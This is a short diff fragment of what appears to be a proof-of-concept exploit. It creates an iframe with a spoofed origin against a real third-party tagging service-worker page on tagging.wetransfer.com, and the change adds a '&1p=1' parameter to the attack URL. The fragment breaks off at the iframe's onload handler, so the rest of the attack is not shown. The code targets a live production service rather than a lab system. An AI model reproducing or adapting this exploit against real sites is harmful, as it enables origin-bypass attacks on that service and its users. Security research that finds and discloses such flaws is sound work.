@@ -11,7 +11,7 @@
 
         // 1. Create iframe with spoofed origin
         const iframe = document.createElement('iframe');
-        iframe.src = 'https://tagging.wetransfer.com/_/service_worker/5230/sw_iframe.html?origin=https://daemoon.me';
+        iframe.src = 'https://tagging.wetransfer.com/_/service_worker/5230/sw_iframe.html?origin=https://daemoon.me&1p=1';
         document.body.appendChild(iframe);
 
         iframe.onload = () => {
